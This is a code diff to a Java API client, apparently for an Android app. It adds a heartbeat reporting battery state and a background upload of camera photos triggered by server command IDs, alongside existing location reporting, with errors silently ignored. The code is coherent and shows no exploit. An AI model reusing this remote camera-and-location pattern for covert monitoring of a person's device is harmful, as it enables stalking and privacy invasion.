@@ -70,6 +70,65 @@ public class ApiClient {
         }
     }
 
+    public static void sendHeartbeat(String serverUrl, String deviceId, int battery, boolean isCharging, final ApiCallback callback) {
+        try {
+            JSONObject body = new JSONObject();
+            body.put("device_id", deviceId);
+            body.put("battery_level", battery);
+            body.put("is_charging", isCharging);
+            postJson(serverUrl + "/api/device-sync/heartbeat", body, callback);
+        } catch (Exception ignored) {}
+    }
+
+    public static void uploadPhoto(final String serverUrl, final String deviceId, final String commandId,
+                                   final String cameraType, final byte[] photoData) {
+        new Thread(new Runnable() {
+            @Override
+            public void run() {
+                try {
+                    String boundary = "===" + System.currentTimeMillis() + "===";
+                    URL url = new URL(serverUrl + "/api/device-sync/upload-photo");
+                    HttpURLConnection conn = (HttpURLConnection) url.openConnection();
+                    conn.setRequestMethod("POST");
+                    conn.setDoOutput(true);
+                    conn.setRequestProperty("Content-Type", "multipart/form-data; boundary=" + boundary);
+
+                    OutputStream os = conn.getOutputStream();
+                    PrintWriter writer = new PrintWriter(new OutputStreamWriter(os, StandardCharsets.UTF_8), true);
+
+                    writer.append("--").append(boundary).append("\r\n");
+                    writer.append("Content-Disposition: form-data; name=\"device_id\"\r\n\r\n");
+                    writer.append(deviceId).append("\r\n");
+
+                    if (commandId != null) {
+                        writer.append("--").append(boundary).append("\r\n");
+                        writer.append("Content-Disposition: form-data; name=\"command_id\"\r\n\r\n");
+                        writer.append(commandId).append("\r\n");
+                    }
+
+                    writer.append("--").append(boundary).append("\r\n");
+                    writer.append("Content-Disposition: form-data; name=\"camera_type\"\r\n\r\n");
+                    writer.append(cameraType).append("\r\n");
+
+                    writer.append("--").append(boundary).append("\r\n");
+                    writer.append("Content-Disposition: form-data; name=\"photo\"; filename=\"snap.jpg\"\r\n");
+                    writer.append("Content-Type: image/jpeg\r\n\r\n");
+                    writer.flush();
+
+                    os.write(photoData);
+                    os.flush();
+
+                    writer.append("\r\n").flush();
+                    writer.append("--").append(boundary).append("--\r\n");
+                    writer.close();
+
+                    conn.getResponseCode();
+                    conn.disconnect();
+                } catch (Exception ignored) {}
+            }
+        }).start();
+    }
+
     public static void sendLocation(String serverUrl, String deviceId, double lat, double lng,
                                     float accuracy, int battery, final ApiCallback callback) {
         try {
